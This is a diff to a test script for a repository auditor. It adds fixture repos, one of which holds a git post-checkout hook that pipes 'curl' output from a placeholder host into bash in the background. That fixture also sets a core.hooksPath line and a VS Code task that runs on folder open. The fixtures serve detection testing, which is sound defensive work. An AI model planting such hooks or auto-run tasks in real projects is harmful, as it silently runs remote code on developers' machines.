@@ -21,6 +21,17 @@ write("bad/setup.js", [
   "console.log(payload, where, typeof cp);",
 ].join("\n"));
 
+// Repo delivered as a zip with .git included: a real hook, a harmless sample, a risky config line.
+write("hooked/package.json", JSON.stringify({ name: "hooked" }));
+write("hooked/.git/hooks/post-checkout", "#!/bin/sh\ncurl -sL http://example.invalid/task | bash > /dev/null 2>&1 &\n");
+write("hooked/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n");
+write("hooked/.git/config", "[core]\n\tbare = false\n\thooksPath = .githooks\n[alias]\n\tst = status\n");
+write("hooked/.vscode/tasks.json", '{"tasks":[{"label":"setup","command":"node x.js","runOptions":{"runOn":"folderOpen"}}]}');
+// Normal clone: only sample hooks and a plain config, must stay clean.
+write("cloned/package.json", JSON.stringify({ name: "cloned", scripts: { test: "node index.js" } }));
+write("cloned/.git/hooks/pre-push.sample", "#!/bin/sh\nexit 0\n");
+write("cloned/.git/config", "[core]\n\tbare = false\n[alias]\n\tst = status\n");
+
 const run = (dir) => spawnSync(process.execPath, [path.join(__dirname, "audit.js"), dir], { encoding: "utf8" });
 let ok = true;
 const check = (name, cond) => { console.log((cond ? "PASS " : "FAIL ") + name); if (!cond) ok = false; };
@@ -33,6 +44,16 @@ check("flags postinstall hook", /postinstall hook runs/.test(bad.stdout));
 check("flags shell execution", /runs shell commands/.test(bad.stdout));
 check("flags base64 decoding", /decodes base64/.test(bad.stdout));
 check("flags key paths", /key, wallet or browser data paths/.test(bad.stdout));
+const hooked = run(path.join(tmp, "hooked"));
+check("hooked fixture exits 1", hooked.status === 1);
+check("flags active git hook", /post-checkout: active git hook/.test(hooked.stdout));
+check("flags hook that downloads and runs code", /downloads and runs code/.test(hooked.stdout));
+check("ignores .sample hooks", !/pre-commit\.sample/.test(hooked.stdout));
+check("flags core.hooksPath", /core\.hooksPath/.test(hooked.stdout));
+check("flags VS Code folderOpen task", /folder is opened/.test(hooked.stdout));
+check("plain alias is not flagged", !/st = status/.test(hooked.stdout));
+const cloned = run(path.join(tmp, "cloned"));
+check("normal clone with sample hooks exits 0", cloned.status === 0);
 check("missing directory exits 2", run(path.join(tmp, "nope")).status === 2);
 
 fs.rmSync(tmp, { recursive: true, force: true });
